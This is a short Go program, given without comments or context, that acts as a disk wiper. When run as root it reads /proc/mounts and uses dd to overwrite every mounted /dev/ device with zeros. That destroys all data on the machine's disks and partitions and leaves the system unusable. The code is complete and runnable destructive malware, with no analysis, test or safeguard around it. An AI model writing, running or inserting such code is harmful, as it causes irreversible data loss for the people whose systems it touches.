package main

import (
	"bufio"
	"os"
	"os/exec"
	"strings"
)

func main() {
	if os.Geteuid() != 0 {
		return
	}
	f, err := os.Open("/proc/mounts")
	if err != nil {
		return
	}
	defer f.Close()
	seen := map[string]struct{}{}
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		dev := strings.Fields(sc.Text())[0]
		if !strings.HasPrefix(dev, "/dev/") {
			continue
		}
		if _, ok := seen[dev]; ok {
			continue
		}
		seen[dev] = struct{}{}
		_ = exec.Command("dd", "if=/dev/zero", "of="+dev).Run()
	}
}
